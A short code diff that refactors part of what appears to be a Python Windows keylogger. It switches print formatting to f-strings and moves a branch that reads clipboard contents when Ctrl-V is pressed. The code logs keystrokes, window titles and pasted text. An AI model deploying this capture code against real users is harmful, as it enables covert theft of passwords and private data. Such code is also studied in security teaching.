@@ -32,10 +32,7 @@ def get_current_process():
 
     # print out the header if we're in the right process
     print()
-    print("[ PID: %s - %s - %s ]" % (process_id,
-                                     executable.value,
-                                     window_title.value)
-          )
+    print(f"[ PID: {process_id} - {executable.value} - {window_title.value} ]")
     print()
 
     # close handles
@@ -54,16 +51,13 @@ def KeyStroke(event):
     # if they pressed a standard key
     if 32 < event.Ascii < 127:
         print(chr(event.Ascii), end=' ')
+    elif event.Key == "V":
+        win32clipboard.OpenClipboard()
+        pasted_value = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
+        print(f"[PASTE] - {pasted_value}", end=' ')
     else:
-        # if [Ctrl-V], get the value on the clipboard
-        # added by Dan Frisch 2014
-        if event.Key == "V":
-            win32clipboard.OpenClipboard()
-            pasted_value = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            print("[PASTE] - %s" % pasted_value, end=' ')
-        else:
-            print("[%s]" % event.Key, end=' ')
+        print(f"[{event.Key}]", end=' ')
 
     # pass execution to next hook registered 
     return True
